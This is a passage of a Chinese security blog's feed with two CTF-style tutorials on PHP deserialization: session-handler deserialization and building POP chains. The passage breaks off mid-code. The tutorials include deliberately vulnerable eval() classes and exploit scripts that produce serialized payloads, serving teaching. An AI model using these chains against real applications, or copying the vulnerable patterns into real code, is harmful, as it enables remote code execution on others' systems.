    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
    <category term="php" scheme="https://arsenetang.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>反序列化篇之Session反序列化</title>
    <link href="https://arsenetang.github.io/2021/08/31/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://arsenetang.github.io/2021/08/31/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-08-30T16:00:00.000Z</published>
    <updated>2021-08-31T12:37:57.687Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Session反序列化"><a href="#Session反序列化" class="headerlink" title="Session反序列化"></a>Session反序列化</h1><p>Session是一次浏览器和服务器的交互的会话，在ctf中，Session往往有妙用，可以实现反序列化和文件包含，接下来我们先来看看Session具体是啥，然后如何利用Session实现反序列化： </p><span id="more"></span><h2 id="1-Session到底是啥？"><a href="#1-Session到底是啥？" class="headerlink" title="1.Session到底是啥？"></a>1.Session到底是啥？</h2><p>前面我们说到，Session是浏览器和服务器之间交互的会话，会话是啥呢？就是我问候你好吗？你回答说很好。就是一次会话，那么对话完成后，这次会话相当于就结束了，但为什么会出现Session会话呢？因为我们用浏览器访问网站用的是<code>http</code>协议，<code>http</code>协议是一种无状态的协议，就是说它不会储存任何东西，每一次的请求都是没有关联的，无状态的协议好处就是快速；但它也有不方便的地方，比如说我们在<code>login.php</code>登录了，我们肯定希望在<code>index.php</code>中也是登录的状态，否则我们登录还有什么意义呢？但前面说到了<code>http</code>协议是无状态的协议，那访问两个页面就是发起两个<code>http</code>请求，他们俩之间是无关联的，所以无法单纯的在index.php中读取到它在login.php中已经登陆了的；为了解决这个问题，<code>cookie</code>就诞生了，<code>cookie</code>是把少量数据存在<strong>客户端</strong>，它在一个域名下是全局的，相当于<code>php</code>可以在这个域名下的任何页面读取<code>cookie</code>信息，那只要我们访问的两个页面在同一个域名下，那就可以通过<code>cookie</code>获取到登录信息了；但这里就存在安全问题了，因为<code>cookie</code>是存在于客户端的，那用户就是可见的，并且可以随意修改的；那如何又要安全，又可以全局读取信息呢？这时候Session就出现了，其实它的本质和<code>cookie</code>是一样的，只不过它是存在于服务器端的</p><h2 id="2-Session的产生和保存"><a href="#2-Session的产生和保存" class="headerlink" title="2.Session的产生和保存"></a>2.Session的产生和保存</h2><p>上面讲了Session产生的原因，那它具体长啥样子呢？这里我们用<code>php</code>中的Session机制，因为后面讲的反序列化也是基于<code>php</code>的嘛</p><p>首先，当我们需要使用Session时，我们要首先打开Session，开启Session的语句是<code>session_start();</code>，这个函数没有任何返回值，既不会成功也不会报错，它的作用是打开Session，并且随机生成一个32位的session_id，session的全部机制也是基于这个session_id，服务器就是通过这个唯一的session_id来区分出这是哪个用户访问的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;session_id(): &quot;</span>.session_id().<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;COOKIE: &quot;</span>.<span class="variable">$_COOKIE</span>[<span class="string">&quot;PHPSESSID&quot;</span>];</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/28/J7ortzcFVEQxmld.png" alt="image.png"></p><p>这里可以看出<code>session_id()</code>这个系统方法是输出了本次生成的<code>session_id</code>，并且存入了<code>COOKIE</code>中，参数名为<code>PHPSESSID</code>，这两个值是相同的，而且只要浏览器一直不关，无论刷新多少次它的值都是不变的，但当你关掉浏览器之后它就消失了，重新打开之后会生成一个新的<code>session_id</code>，<code>session_id</code>就是用来标识一个用户的，就像是一个人的身份证一样，接下来就来看看<code>session</code>它是怎么保存的：</p><p>它是保存在服务器中的临时目录下的，保存的路径需要看<code>php.ini</code>的配置，我的是保存在<code>D:\phpStudy\PHPTutorial\tmp\tmp</code>这个路径下的，我们可以打开来看看：</p><p><img src="https://i.loli.net/2021/08/31/CwDpVaNfhzqcoiQ.png" alt="image.png"></p><p>可以看到它的储存形式是文件名为<code>sess</code>+<code>_</code>+<code>session_id</code>，那我们能不能通过修改<code>COOKIE</code>中<code>PHPSESSID</code>的值来修改<code>session_id</code>呢？</p><p><img src="https://i.loli.net/2021/08/31/Z2GlbtcJQ9iy8fC.png" alt="image.png"></p><p>然后刷新页面，可以发现成功了，成功修改了<code>session_id</code>的值，并且去保存的路径下去看发现也成功写进去了：</p><p><img src="https://i.loli.net/2021/08/31/9Qavjy1cpxusBwL.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/08/31/YZqu1PxcjoMhVRA.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/08/31/Yme8yTvJ6UMBdCi.png" alt="image.png"></p><p>但由上图可知，它的文件内容是为空的，里面什么都没有，那我们能不能尝试往里面写入东西呢？依然在<code>a.php</code>中操作，给它赋个值：</p><p><img src="https://i.loli.net/2021/08/31/pWkHluF9Cgdzfms.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/08/31/4Urn52OjRpSwlXQ.png" alt="image.png"></p><p>发现成功写进去了，它的内容就是将键值对<strong>序列化</strong>之后的结果</p><p>我们把大致过程总结一下：</p><p>就是HTTP请求一个页面后，如果用到开启<code>session</code>，会去读<code>COOKIE</code>中的<code>PHPSESSID</code>是否有，如果没有，则会新生成一个<code>session_id</code>，先存入<code>COOKIE</code>中的<code>PHPSESSID</code>中，再生成一个<code>sess_</code>前缀文件。当有<strong>写入</strong><code>$_SESSION</code>的时候，就会往<code>sess_</code>文件里序列化写入数据。当<strong>读取</strong>到<code>session</code>变量的时候，先会读取<code>COOKIE</code>中的<code>PHPSESSID</code>，获得<code>session_id</code>，然后再去找这个<code>sess_session_id</code>文件，来获取对应的数据。由于默认的<code>PHPSESSID</code>是临时的会话，在浏览器关闭后就会消失，所以，当我们打开浏览器重新访问的时候，就会新生成<code>session_id</code>和<code>sess_session_id</code>这个文件。</p><h2 id="3-有关的配置"><a href="#3-有关的配置" class="headerlink" title="3.有关的配置"></a>3.有关的配置</h2><p>好了，上面铺垫了这么多，应该明白<code>Session</code>是什么以及<code>Session</code>的机制了，下面就开始正式进入正题，来看看<code>Session</code>反序列化</p><p>首先，我们先去<code>php.ini</code>中去看几项与<code>session</code>有关的配置：</p><p>1.<code>session.save_path</code>：这个是<code>session</code>的存储路径，也就是上文中<code>sess_session_id</code>那个文件存储的路径</p><p><img src="https://i.loli.net/2021/08/31/imyDdvK7orU8SGN.png" alt="image.png"></p><p>2.<code>session.auto_start</code>：这个开关是指定是否在请求开始时就自动启动一个会话，默认为Off；如果它为<code>On</code>的话，相当于就先执行了一个<code>session_start()</code>，会生成一个<code>session_id</code>，一般来说这个开关是不会打开的</p><p><img src="https://i.loli.net/2021/08/31/SZsx4y75Ar21g3q.png" alt="image.png"></p><p>3.<code>session.save_handler</code>：这个是设置用户自定义<code>session</code>存储的选项，默认是<code>files</code>，也就是以文件的形式来存储的，当然你也可以选择其它的形式，比如说数据库啥的</p><p><img src="https://i.loli.net/2021/08/31/fzFZkhPS1GLcRmv.png" alt="image.png"></p><p>4.<code>session.serialize_handler</code>：这个是最为重要的一个，用来定义<code>session</code>序列化存储所用的处理器的名称，不同的处理器序列化以及读取出来会产生不同的结果；默认的处理器为<code>php</code>，常见的还有<code>php_binary</code>和<code>php_serialize</code>，接下来来一个一个的看它们：</p><p><img src="https://i.loli.net/2021/08/31/an7clWUwmOItDTL.png" alt="image.png"></p><p>首先是<code>php</code>，因为它默认就是<code>php</code>，所以说用的应该是最多的，它处理之后的格式是<strong>键名+竖线|+经过<code>serialize()</code>序列化处理后的值</strong></p><p><img src="https://i.loli.net/2021/08/31/sL8hIynZeMXVgSF.png" alt="image.png"></p><p>然后我们来看<code>php_binary</code>，首先我们把处理器换成<code>php_binary</code>需要用语句<code>ini_set(&#39;session.serialize_handler&#39;,&#39;php_binary&#39;);</code>这个处理器的格式是<strong>键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数序列化处理后的值</strong>；注意这个键名的长度所所对应的ASCII字符，就比如说键名长度为4，那它对应的就是ASCII码为4的字符，是个不可见字符EOT，具体可见下表，从1到31都是不可见字符</p><p><img src="https://i.loli.net/2021/07/27/vmfHFZrN9GLSC8j.png" alt="image.png"></p><p>所以说它最后的结果如下，框框代表的就是不可见字符：</p><p><img src="https://i.loli.net/2021/08/31/8PHjUL3ptbgEMT7.png" alt="image.png"></p><p>最后我们来看<code>php_serialize</code>，这个处理器需要php版本&gt;5.5.4才能使用，首先我们还是得先用<code>ini_set</code>进行设置，语句如下：<code>ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);</code>这个的格式是<strong>直接进行序列化，把<code>session</code>中的键和值都会被进行序列化操作</strong>，然后把它当成一个数组返回回来：</p><p><img src="https://i.loli.net/2021/08/31/I5LW637GnHtzsrB.png" alt="image.png"></p><h2 id="4-Session反序列化原理"><a href="#4-Session反序列化原理" class="headerlink" title="4.Session反序列化原理"></a>4.Session反序列化原理</h2><p>讲了这么多，相信很多人还是一头雾水，那为什么会产生<code>Session</code>反序列化漏洞呢？这个问题其实也困扰了我很久，以前我也是只知道操作但不清楚原理，知道前面加个<code>|</code>就可以成功但至于为什么就一脸懵逼，因为我们都知道<code>Session</code>反序列化是不需要<code>unserialize()</code>函数就可以实现的，那这具体是怎么实现的呢？今天就来把它彻底搞懂：</p><p>首先我们再来看看<code>session_start()</code>函数，前面我们看到的是没有打开<code>Session</code>的情况下它是打开<code>Session</code>并且返回一个<code>session_id</code>，但假如我们前面就已经打开了<code>Session</code>呢？这里我们再来看看官方文档：</p><p><img src="https://i.loli.net/2021/08/31/xFO1zyPubdHliQT.png" alt="image.png"></p><p>这里重点看我框了的内容，尤其我箭头指向的地方，它会自动反序列化数据，那就很漂亮啊！这里就解决了没有<code>unserialize()</code>的问题，那我们可不可以考虑先把序列化后的数据写入<code>sess_session_id</code>文件中，然后在有反序列化漏洞页面刷新页面，由于这个页面依然有<code>session_start()</code>，那它就去读取那个文件的内容，然后自动进行反序列化操作，这样就会触发反序列化漏洞，完美！！</p><p>这个思路理论上是可以成功的，但这里还有一个核心问题没有解决，就是说我们怎么让它<strong>反序列化的是我们传入的序列化的内容</strong>，因为我们传入的是键值对，那么<code>session</code>序列化存储所用的处理器肯定也是将这个<strong>键值对</strong>写了进去，那我们怎么让它正好反序列化到我们传入的内容呢？这里就需要介绍出<strong>两种处理器的差别</strong>了，<code>php</code>处理器写入时的格式为<code>键名+竖线|+经过serialize()序列化处理后的值</code>那它读取时，肯定就会以<code>竖线|</code>作为一个分隔符，前面的为键名，后面的为键值，然后将键值进行<strong>反序列化</strong>操作；而<code>php_serialize</code>处理器是直接进行序列化，然后返回<strong>序列化后的数组</strong>，那我们能不能在我们传入的序列化内容前加一个分隔符<code>|</code>，从而正好<strong>序列化我们传入的内容呢</strong>？</p><p>这肯定是可以的，而这正是我们<code>Session</code>反序列化的原理，如果看到这有点发晕的话，没关系，咱接着往下看，接下来咱来分析一个例子</p><h2 id="5-案例分析"><a href="#5-案例分析" class="headerlink" title="5.案例分析"></a>5.案例分析</h2><p>首先我们来写一个存在反序列化漏洞的页面：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这应该是很简单的一个反序列化，反序列化后会先直接进入<code>__wakeup()</code>，然后就<code>eval</code>执行任意代码了，我们先写个exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后我们再写一个页面，因为这里既没有传参的点也没有反序列化的点，相对于有漏洞利用不了，那我们就写一个利用它的页面<code>sess.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;test&#x27;</span>]=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>有了这个页面我们就可以把想要的内容写入到<code>Session</code>中了，然后就可以在有漏洞的页面中执行反序列化了，接下来开始操作，首先运行<code>exp.php</code>：</p><p><img src="https://i.loli.net/2021/08/31/2iyrQq49pSMuBdL.png" alt="image.png"></p><p>然后我们通过<code>sess.php</code>将运行结果写入<code>Session</code>中，记得在前面加上<code>|</code>：</p><p><img src="https://i.loli.net/2021/08/31/aulerJ2YxZfX54j.png" alt="image.png"></p><p>然后我们去看它成功写入<code>Session</code>没有，并且看看写入的内容是什么：</p><p><img src="https://i.loli.net/2021/08/31/bBCtN8mdnayOK4u.png" alt="image.png"></p><p>可以看到它已经成功写入进去了，并且内容也是我们想要的内容，按照<code>php</code>处理器的处理方法，会以<code>|</code>为分隔符，左边为键，右边为值，然后将值进行反序列化操作，那我们就去有漏洞的页面去刷新，看看它有没有反序列化之后触发反序列化漏洞：</p><p><img src="https://i.loli.net/2021/08/31/jNbHJdVaEifs1k6.png" alt="image.png"></p><p>bingo，发现成功拿下，漂亮！！因为我没找到合适的ctf例题，这次这个我就不举具体的例子了，希望大家都能把原理搞懂</p><p>文章参考：</p><p><a href="https://blog.csdn.net/think2me/article/details/38726429">https://blog.csdn.net/think2me/article/details/38726429</a></p><p><a href="https://www.freebuf.com/articles/web/264740.html">https://www.freebuf.com/articles/web/264740.html</a></p><p><a href="https://cloud.tencent.com/developer/article/1740495">https://cloud.tencent.com/developer/article/1740495</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Session反序列化&quot;&gt;&lt;a href=&quot;#Session反序列化&quot; class=&quot;headerlink&quot; title=&quot;Session反序列化&quot;&gt;&lt;/a&gt;Session反序列化&lt;/h1&gt;&lt;p&gt;Session是一次浏览器和服务器的交互的会话，在ctf中，Session往往有妙用，可以实现反序列化和文件包含，接下来我们先来看看Session具体是啥，然后如何利用Session实现反序列化： &lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
    <category term="php" scheme="https://arsenetang.github.io/tags/php/"/>
    
    <category term="反序列化" scheme="https://arsenetang.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>反序列化篇之pop链的构造(下)</title>
    <link href="https://arsenetang.github.io/2021/08/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8Bpop%E9%93%BE%E7%9A%84%E6%9E%84%E9%80%A0(%E4%B8%8B)/"/>
    <id>https://arsenetang.github.io/2021/08/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8Bpop%E9%93%BE%E7%9A%84%E6%9E%84%E9%80%A0(%E4%B8%8B)/</id>
    <published>2021-08-16T16:00:00.000Z</published>
    <updated>2021-08-17T14:59:13.637Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pop链的构造-下篇"><a href="#pop链的构造-下篇" class="headerlink" title="pop链的构造(下篇)"></a>pop链的构造(下篇)</h1><p>上篇文章中我们详细介绍了魔术方法及调用它们的条件，那么这篇文章就来研究在实例中如何调用它们，并且把它们连成一条pop链，首先，我们来看看什么是pop链</p><span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>pop又称之为<strong>面向属性编程</strong><code>(Property-Oriented Programing)</code>，常用于上层语言构造特定调用链的方法，与二进制利用中的<strong>面向返回编程</strong><code>(Return-Oriented Programing)</code>的原理相似，都是<strong>从现有运行环境</strong>中寻找一系列的代码或者指令调用，然后根据需求构成一组<strong>连续的调用链</strong>,最终达到攻击者邪恶的目的；只不过ROP是通过<strong>栈溢出</strong>实现控制指令的执行流程，而我们的反序列化是通过<strong>控制对象的属性</strong>从而实现控制程序的执行流程；因为反序列化中我们能控制的也就只有对象的<strong>属性</strong>了，所以k0rz3n大佬说反序列化漏洞又叫<strong>对象的属性篡改漏洞</strong>，我觉得就很有道理哈哈哈</p><h2 id="构造思路"><a href="#构造思路" class="headerlink" title="构造思路"></a>构造思路</h2><p>任何一条链子的构造，我们都要先找到它的头和尾，pop链也不例外，pop链的头部一般是用户能传入参数的地方，而尾部是可以执行我们操作的地方，比如说读写文件，执行命令等等；找到头尾之后，从尾部(我们执行操作的地方)开始，看它在哪个方法中，怎么样可以调用它，一层一层往上倒推，直到推到头部为止，也就是我们传参的地方，一条pop链子就出来了；在ctf中，头部一般都会是GET或者POST传参，然后可能就有一个<code>unserialize</code>直接将我们传入的参数反序列化了，尾部都是拿flag的地方；然后一环连着一环构成pop链</p><h2 id="例题解析一："><a href="#例题解析一：" class="headerlink" title="例题解析一："></a>例题解析一：</h2><p>一般来说，出现php反序列化漏洞是因为有写的不安全的魔术方法，因为魔术方法会自动调用，那我们就可以构造恶意的exp来触发它，但有的时候如果出现漏洞的代码不在魔术方法中，而是只在一个普通方法中，那我们怎么利用呢？这时候我们可以寻找魔术方法中是否调用了同名的函数，然后通过相同的函数名将类的属性和魔术方法中的属性联系起来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ClassObj</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> normal();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;HelloWorld&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>比如说上面这个例子，危险函数应该是<code>evil</code>类中的<code>action</code>方法，里面有个<code>eval</code>，但<code>action</code>方法并不是魔术方法，一般情况下我们是很难调用它的，但我们看到<code>test</code>类中的<code>__destruct()</code>调用了<code>action</code>方法，但在<code>__construct()</code>中可以看出它创建了一个<code>normal</code>类的对象，然后调用的是<code>normal</code>类中的<code>action</code>方法；这个就很好办，我们把魔术方法中的属性改一下，改成创建一个<code>evil</code>类的对象，那它自然调用的就是<code>evil</code>类中的<code>action</code>方法了，有了思路下面就来构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ClassObj</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> evil();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> test();</span><br><span class="line"><span class="variable">$b</span> -&gt; ClassObj = <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(urlencode(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本来构造出来应该是这样，创建一个<code>evil</code>类的对象然后把它赋值给<code>ClassObj</code>属性，但这里这样写不行，因为<code>ClassObj</code>属性是<code>protected</code>属性，不能在类外面访问它，所以说我们得在<code>test</code>类里面写一个<code>__construct()</code>来完成这个操作：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ClassObj</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> evil();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/16/CgL5JVlSFiTMs9Z.png" alt="image.png"></p><p>经检验没有问题，这应该是最简单的pop链了，从头到尾只有一步就完成</p><h2 id="例题解析二："><a href="#例题解析二：" class="headerlink" title="例题解析二："></a>例题解析二：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str=<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source=<span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uwant</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getshell(<span class="keyword">$this</span>-&gt;params);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getshell</span>(<span class="params"><span 